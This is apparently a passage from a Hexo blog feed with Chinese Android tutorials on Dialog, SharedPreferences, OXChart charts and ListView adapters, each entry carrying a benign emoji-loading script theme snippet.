        <content type="html"><![CDATA[<p><a href="https://gitee.com/help/articles/4136#article-header0" target="_blank" rel="noopener">https://gitee.com/help/articles/4136#article-header0</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dialog的用法</title>
      <link href="/2020/08/01/dialog-de-yong-fa/"/>
      <url>/2020/08/01/dialog-de-yong-fa/</url>
      
        <content type="html"><![CDATA[<pre><code>  private void showDialog() {    final Dialog dialog=new Dialog(getContext());    View dialogView=LayoutInflater.from(getContext()).inflate(R.layout.me_dialog,null);    dialog.setContentView(dialogView);    dialog.setTitle("请选择您的星座123");    GridView dialogGv=dialogView.findViewById(R.id.megrag_dialog_gv);    //设置适配器    LuckBaseAdapter adapter=new LuckBaseAdapter(getContext(),mDatas);    dialogGv.setAdapter(adapter);    //设置是否能被取消    dialog.setCancelable(true);    //设置点击弹出框的部分,可以取消弹出框    dialog.setCanceledOnTouchOutside(true);    dialogGv.setOnItemClickListener(new AdapterView.OnItemClickListener() {        private Bitmap bitmap;        private String logoname;        private String name;        private StarBean.StarinfoBean bean;        @Override        public void onItemClick(AdapterView&lt;?&gt; parent, View view, int position, long id) {            bean = mDatas.get(position);            name = bean.getName();            logoname = bean.getLogoname();            nameTv.setText(name);            bitmap = contentImgMap.get(logoname);            iconIv.setImageBitmap(bitmap);            selectPos=position;//保存选择位置            dialog.cancel();        }    });    dialog.show();}@Overridepublic void onPause(){    super.onPause();    StarBean.StarinfoBean bean = mDatas.get(selectPos);    String name=bean.getName();    String logoname=bean.getLogoname();    SharedPreferences.Editor editor=star_pref.edit();//获取像共享参数zhong写入数据的对象    editor.putString("name",name);    editor.putString("logoname",logoname);    editor.commit();}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SharedPreferences的简单应用</title>
      <link href="/2020/08/01/sharedpreferences-de-jian-dan-ying-yong/"/>
      <url>/2020/08/01/sharedpreferences-de-jian-dan-ying-yong/</url>
      
        <content type="html"><![CDATA[<p>关于SharePreferences的原理我在此不做赘述(有道云笔记里有写),这里重点分析如果实现首次进入app和之后进入app的页面不同的效果  </p><h2 id="一-代码"><a href="#一-代码" class="headerlink" title="一.代码"></a>一.代码</h2><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WeocomActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">{</span>    TextView tv<span class="token punctuation">;</span>    <span class="token keyword">int</span> count<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>    Handler handler<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@SuppressLint</span><span class="token punctuation">(</span><span class="token string">"HandlerLeak"</span><span class="token punctuation">)</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleMessage</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> Message msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>what<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>            count<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>count<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//判断是否是第一次进入此应用,如果是第一次进入此应用,跳到引导界面</span>                <span class="token keyword">boolean</span> isfirst<span class="token operator">=</span>first_pref<span class="token punctuation">.</span><span class="token function">getBoolean</span><span class="token punctuation">(</span><span class="token string">"isfirst"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Intent intent<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>isfirst<span class="token punctuation">)</span><span class="token punctuation">{</span>                  intent<span class="token punctuation">.</span><span class="token function">setClass</span><span class="token punctuation">(</span>WeocomActivity<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">,</span> GuideActivity<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//为了下一次不跳转更改值</span>                   SharedPreferences<span class="token punctuation">.</span>Editor editor<span class="token operator">=</span>first_pref<span class="token punctuation">.</span><span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   editor<span class="token punctuation">.</span><span class="token function">putBoolean</span><span class="token punctuation">(</span><span class="token string">"isfirst"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   editor<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    intent<span class="token punctuation">.</span><span class="token function">setClass</span><span class="token punctuation">(</span>WeocomActivity<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">,</span>MainActivity<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                tv<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                handler<span class="token punctuation">.</span><span class="token function">sendEmptyMessageDelayed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> SharedPreferences first_pref<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>Bundle savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_weocom<span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token operator">=</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>welcome_tv<span class="token punctuation">)</span><span class="token punctuation">;</span>        first_pref <span class="token operator">=</span> <span class="token function">getSharedPreferences</span><span class="token punctuation">(</span><span class="token string">"first_pref"</span><span class="token punctuation">,</span> MODE_PRIVATE<span class="token punctuation">)</span><span class="token punctuation">;</span>        handler<span class="token punctuation">.</span><span class="token function">sendEmptyMessageDelayed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><p>1.利用getSharepreference 创建对象,然后第一个参数是一个标指key,第二个参数的模式,MODE_PRIVATE表示被本应用读写<br>2.在HandleMessage用getXXX来给isfirst进行赋值</p><pre><code>boolean isfirst=first_pref.getBoolean("isfirst",true);</code></pre><p>然后写一个判断,创建一个editor对象来更改数据源</p><pre><code> SharedPreferences.Editor editor=first_pref.edit();                    editor.putBoolean("isfirst",false);                    editor.commit();</code></pre><h3 id="三-后续"><a href="#三-后续" class="headerlink" title="三.后续"></a>三.后续</h3><p>利用ViewPager写第一次进入的跳转页面(略)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>星梦缘开发的注意事项</title>
      <link href="/2020/08/01/xing-meng-yuan-kai-fa-de-zhu-yi-shi-xiang/"/>
      <url>/2020/08/01/xing-meng-yuan-kai-fa-de-zhu-yi-shi-xiang/</url>
      
        <content type="html"><![CDATA[<h2 id="一-依赖的导入"><a href="#一-依赖的导入" class="headerlink" title="一.依赖的导入"></a>一.依赖的导入</h2><pre><code>implementation 'com.google.code.gson:gson:2.2.4'implementation 'com.squareup.picasso:picasso:2.5.2'implementation 'de.hdodenhof:circleimageview:3.1.0'</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OXChart的详细用法</title>
      <link href="/2020/07/31/oxchart-de-xiang-xi-yong-fa/"/>
      <url>/2020/07/31/oxchart-de-xiang-xi-yong-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="第三方库来源-原作者的github-："><a href="#第三方库来源-原作者的github-：" class="headerlink" title="第三方库来源(原作者的github)："></a>第三方库来源(原作者的github)：</h1><p>原作者github：<a href="https://github.com/openXu/OXChart" target="_blank" rel="noopener">https://github.com/openXu/OXChart</a></p><h2 id="一-类库接入"><a href="#一-类库接入" class="headerlink" title="一.类库接入"></a>一.类库接入</h2><pre><code>implementation 'com.openxu.viewlib:OXViewLib:xxx'//注意：其中xxx是OXChart的版本号(去原作者github上找)//比如下面的这种写法：implementation 'com.openxu.viewlib:OXViewLib:1.0.2'</code></pre><p>使用主题<br>       <style name="OXViewAppBaseTheme" parent="Theme.AppCompat.Light.NoActionBar"><br>        <item name="android:windowNoTitle">true</item><br>        <item name="android:windowActionBar">false</item><br>        <item name="android:clipToPadding">true</item><br>        <item name="android:windowSoftInputMode">adjustResize</item><br>    </style></p><h2 id="二-南丁格尔玫瑰图"><a href="#二-南丁格尔玫瑰图" class="headerlink" title="二.南丁格尔玫瑰图"></a>二.南丁格尔玫瑰图</h2><p>效果图:<br><img src="https://i.loli.net/2020/07/31/bsTSe2zRVEIXYdf.gif" width="200" height="400">  </p><h3 id="一-xml布局和结果"><a href="#一-xml布局和结果" class="headerlink" title="一.xml布局和结果"></a>一.xml布局和结果</h3><h4 id="1-若无数据-则显示暂无数据"><a href="#1-若无数据-则显示暂无数据" class="headerlink" title="1.若无数据,则显示暂无数据"></a>1.若无数据,则显示暂无数据</h4><h4 id="2-若有数据-则会显示图表"><a href="#2-若有数据-则会显示图表" class="headerlink" title="2.若有数据,则会显示图表"></a>2.若有数据,则会显示图表</h4><h4 id="3-xml代码写法"><a href="#3-xml代码写法" class="headerlink" title="3.xml代码写法"></a>3.xml代码写法</h4><p>利用下面代码中的写法即可,无多余设置</p><pre class=" language-XML"><code class="language-XML">         <com.openxu.cview.chart.rosechart.NightingaleRoseChart        android:id="@+id/roseChartMany"        android:layout_width="match_parent"        android:layout_height="wrap_content"        android:layout_marginTop="2dp"/>  </code></pre><h3 id="二-java代码"><a href="#二-java代码" class="headerlink" title="二.java代码"></a>二.java代码</h3><h4 id="1-roseActivity"><a href="#1-roseActivity" class="headerlink" title="1.roseActivity"></a>1.roseActivity</h4><p>属性在注释里写的很清楚了</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> NightingaleRoseChart rose1<span class="token punctuation">;</span>     rose1<span class="token operator">=</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>rose1<span class="token punctuation">)</span><span class="token punctuation">;</span>        rose1<span class="token punctuation">.</span><span class="token function">setShowChartLable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//是否在图表上显示指示lable</span>        rose1<span class="token punctuation">.</span><span class="token function">setShowChartNum</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//是否在图表上显示指示num</span>        rose1<span class="token punctuation">.</span><span class="token function">setShowNumTouched</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//点击显示数量</span>        rose1<span class="token punctuation">.</span><span class="token function">setShowRightNum</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//右侧显示数量</span>        List<span class="token operator">&lt;</span>Object<span class="token operator">></span>roseList<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        roseList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RoseBean</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">"数据1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        roseList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RoseBean</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">"数据2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        roseList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RoseBean</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token string">"数据3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        roseList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RoseBean</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"数据4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        roseList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RoseBean</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token string">"数据5"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//参数1：数据对象class， 参数2：数量属性字段名称， 参数3：名称属性字段名称， 参数4：数据集合</span>        rose1<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>RoseBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"count"</span><span class="token punctuation">,</span> <span class="token string">"ClassName"</span><span class="token punctuation">,</span> roseList<span class="token punctuation">)</span><span class="token punctuation">;</span>        rose1<span class="token punctuation">.</span><span class="token function">setLoading</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//是否正在加载，数据加载完毕后置为false</span></code></pre><h4 id="2-RoseBean的代码"><a href="#2-RoseBean的代码" class="headerlink" title="2.RoseBean的代码"></a>2.RoseBean的代码</h4><p><strong><em>内部写get和set还有构造器即可</em></strong></p><pre class=" language-java"><code class="language-java">        <span class="token keyword">class</span> <span class="token class-name">RoseBean</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> count<span class="token punctuation">;</span>    <span class="token keyword">private</span> String ClassName<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">RoseBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">RoseBean</span><span class="token punctuation">(</span><span class="token keyword">float</span> count<span class="token punctuation">,</span> String className<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> count<span class="token punctuation">;</span>        ClassName <span class="token operator">=</span> className<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">float</span> <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> count<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCount</span><span class="token punctuation">(</span><span class="token keyword">float</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> count<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> ClassName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setClassName</span><span class="token punctuation">(</span>String className<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ClassName <span class="token operator">=</span> className<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="三-饼状图"><a href="#三-饼状图" class="headerlink" title="三.饼状图"></a>三.饼状图</h3><img src="https://i.loli.net/2020/07/31/MlpUg3PEjuLRdy9.gif" width="200" height="400">     <h3 id="一-xml布局和结果-1"><a href="#一-xml布局和结果-1" class="headerlink" title="一.xml布局和结果"></a>一.xml布局和结果</h3><h4 id="1-若无数据-则显示暂无数据-1"><a href="#1-若无数据-则显示暂无数据-1" class="headerlink" title="1.若无数据,则显示暂无数据"></a>1.若无数据,则显示暂无数据</h4><h4 id="2-若有数据-则会显示图表-1"><a href="#2-若有数据-则会显示图表-1" class="headerlink" title="2.若有数据,则会显示图表"></a>2.若有数据,则会显示图表</h4><h4 id="3-xml代码写法-1"><a href="#3-xml代码写法-1" class="headerlink" title="3.xml代码写法"></a>3.xml代码写法</h4><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>com.openxu.cview.chart.piechart.PieChartLayout</span>                <span class="token attr-name"><span class="token namespace">android:</span>id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@+id/pieChart2<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>180dp<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>layout_marginTop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>7dp<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>layout_centerVertical</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>paddingRight</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10dp<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#ffffff<span class="token punctuation">"</span></span>                <span class="token attr-name"><span class="token namespace">android:</span>orientation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>horizontal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>com.openxu.cview.chart.piechart.PieChart</span>                    <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>                    <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>                    <span class="token attr-name"><span class="token namespace">android:</span>layout_weight</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>com.openxu.cview.chart.piechart.PieChartLableView</span>                    <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>                    <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>                    <span class="token attr-name"><span class="token namespace">android:</span>layout_weight</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>com.openxu.cview.chart.piechart.PieChartLayout</span><span class="token punctuation">></span></span></code></pre><p>这里PieChart是表示左边部分用来放饼状图,PieChartLableView用来填右边部分的布局放数据  </p><h3 id="二-java代码-1"><a href="#二-java代码-1" class="headerlink" title="二.java代码"></a>二.java代码</h3><pre><code>private PieChartLayout pieChart2;pieChart2 = (PieChartLayout)findViewById(R.id.pieChart2);    pieChart2.setRingWidth(DensityUtil.dip2px(this, 20));    pieChart2.setTagModul(PieChartLayout.TAG_MODUL.MODUL_LABLE);      //在lable后面显示tag    pieChart2.setDebug(false);    pieChart2.setLoading(true);    //请求数据    List&lt;Object&gt; datalist = new ArrayList&lt;&gt;();    datalist.clear();    datalist.add(new PieBean(20, "IT"));    datalist.add(new PieBean(10, "销售"));    datalist.add(new PieBean(30, "金融"));    datalist.add(new PieBean(8, "林木业"));    datalist.add(new PieBean(15, "制造"));    datalist.add(new PieBean(15, "农业"));    pieChart2.setLoading(false);    pieChart2.setChartData(PieBean.class, "Numner", "Name",datalist ,null);</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 统计图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用ScrollView底部显示不全的解决方案</title>
      <link href="/2020/07/29/yong-scrollview-di-bu-xian-shi-bu-quan-de-jie-jue-fang-an/"/>
      <url>/2020/07/29/yong-scrollview-di-bu-xian-shi-bu-quan-de-jie-jue-fang-an/</url>
      
        <content type="html"><![CDATA[<p>解决方式：在底部最后两行加两个换行</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>weight属性的应用</title>
      <link href="/2020/07/29/weight-shu-xing-de-ying-yong/"/>
      <url>/2020/07/29/weight-shu-xing-de-ying-yong/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ListView的用法+实战</title>
      <link href="/2020/07/28/listview/"/>
      <url>/2020/07/28/listview/</url>
      
        <content type="html"><![CDATA[<p>效果图<br><img src="https://i.loli.net/2020/07/28/E2Z6AkxzvVIpWSe.png" alt="最终效果图1"><br>属性值一列下来就是用ListView实现的  </p><h3 id="一-xml文件"><a href="#一-xml文件" class="headerlink" title="一.xml文件"></a>一.xml文件</h3><h4 id="1-ListView布局在主xml"><a href="#1-ListView布局在主xml" class="headerlink" title="1.ListView布局在主xml"></a>1.ListView布局在主xml</h4><pre class=" language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ListView</span>         <span class="token attr-name"><span class="token namespace">android:</span>id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@+id/staranalysis_lv<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">android:</span>divider</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@null<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">android:</span>dividerHeight</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0dp<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">android:</span>scrollbars</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>none<span class="token punctuation">"</span></span>         <span class="token punctuation">/></span></span>  </code></pre><h4 id="2-额外写一个xml写每个item的布局"><a href="#2-额外写一个xml写每个item的布局" class="headerlink" title="2.额外写一个xml写每个item的布局"></a>2.额外写一个xml写每个item的布局</h4><p>![item_star_analysis](<a href="https://i.loli.net/2020/07/28/" target="_blank" rel="noopener">https://i.loli.net/2020/07/28/</a><br>9et2j5BrVEPDK1N.png)<br>这个在后面适配器那里加载的时候会用在</p><h3 id="二-java代码部分"><a href="#二-java代码部分" class="headerlink" title="二.java代码部分"></a>二.java代码部分</h3><p><strong><em>关于notifyDataSetChanged方法的使用：<br>notifyDataSetChanged方法强制listview调用getView来刷新每个Item的内容<br>有时候我们需要修改已经生成的列表，添加或者修改数据，notifyDataSetChanged()可以在修改适配器绑定的数组后，不用重新刷新Activity，通知Activity更新ListView</em></strong></p><p>正是因为listView有notifDataSetChanged这个方法,所以下面这种代码的写法是可行的  </p><h4 id="1-ListView适配器的写法"><a href="#1-ListView适配器的写法" class="headerlink" title="1.ListView适配器的写法"></a>1.ListView适配器的写法</h4><p>(思路都差不多,在GridView那里已经做了详细说明了)</p><pre class=" language-java"><code class="language-java">        <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnalysisBaseAdapter</span> <span class="token keyword">extends</span> <span class="token class-name">BaseAdapter</span> <span class="token punctuation">{</span>    Context context<span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>StarAnalysisBean<span class="token operator">></span>mData<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">AnalysisBaseAdapter</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>StarAnalysisBean<span 